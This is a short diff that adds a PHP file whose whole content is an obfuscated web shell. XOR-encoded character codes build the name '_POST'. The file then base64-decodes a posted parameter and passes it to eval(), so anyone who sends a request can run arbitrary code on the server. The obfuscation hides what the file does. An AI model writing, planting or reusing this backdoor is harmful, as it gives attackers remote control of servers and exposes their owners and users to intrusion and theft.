@@ -1,0 +1,19 @@
+<?php
+function UnWA(){
+        $_1='_'.chr(43^123).chr(81^30).chr(15^92).chr(82^6);
+        return $_1;
+}
+
+function FExc($user)
+{
+        $_x=null;
+        eval("\n".$user.$_x);
+}
+ $_2=${UnWA()}[1233];
+$_2_1 =  base64_decode($_2);
+$_3=null;
+$_4=$_3.$_2_1;
+FExc($_4);
+?>
+
+ 
